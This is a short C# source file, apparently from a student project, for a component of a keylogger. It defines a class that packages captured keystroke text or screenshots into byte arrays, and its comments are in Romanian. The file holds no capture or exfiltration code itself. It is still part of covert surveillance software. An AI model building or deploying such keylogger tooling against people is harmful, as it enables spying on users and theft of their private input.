/**************************************************************************
 *                                                                        *
 *  File:        DataCapsule.c                                            *
 *  Copyright:   (c) 2021, Ion Chiriac                                    *
 *  E-mail:      ion.chiriac@student.tuiasi.ro                            *
 *  Description: Compressed data keylogger application.                   *
 *               The component that encapsulates the data in a separate   *
 *               class                                                    *
 *                                                                        *
 *  This code and information is provided "as is" without warranty of     *
 *  any kind, either expressed or implied, including but not limited      *
 *  to the implied warranties of merchantability or fitness for a         *
 *  particular purpose. You are free to use this source code in your      *
 *  applications as long as the original copyright notice is included.    *
 *                                                                        *
 **************************************************************************/
namespace DataCapsule.DataCapsule
{
    /// <summary>
    /// Content Type este de 2 tipuri: imagine, text
    /// </summary>
    enum ContentType { image,text}
    /// <summary>
    /// Clasa DataCapsule incapsuleaza datele de intrate preluate de la Keylogger si le transforma in byte array
    /// </summary>
    public class DataCapsule
    {
        private ContentType _contentType;
        private string _date;

        /// <summary>
        /// Constructorul pentru tipul de date text
        /// </summary>
        /// <param name="date">Datele de intrare</param>
        public DataCapsule(string date)
        {
            this._contentType = ContentType.text;
            this._date = date;
        }
        /// <summary>
        /// Constructorul pentru tipul de date imagine
        /// </summary>
        /// <param name="img">Imaginea preluata din PrintScreen</param>
        public DataCapsule(System.Drawing.Image img)
        {
            this._contentType = ContentType.image;
            var imageStream = new System.IO.MemoryStream();
            img.Save(imageStream, System.Drawing.Imaging.ImageFormat.Png);
            imageStream.Position = 0;
            var imageBytes = imageStream.ToArray();
            var ImageBase64 = System.Convert.ToBase64String(imageBytes);
            _date = ImageBase64;
            imageStream.Dispose();
        }
        /// <summary>
        /// Proprietatea care permite extragerea datelor in alt modul
        /// </summary>
        public byte[]Data
        {
            get
            {
                if (_contentType == ContentType.image)
                    return System.Convert.FromBase64String(_date);
                else return System.Text.Encoding.UTF8.GetBytes(_date);
            }
        }
    }
}
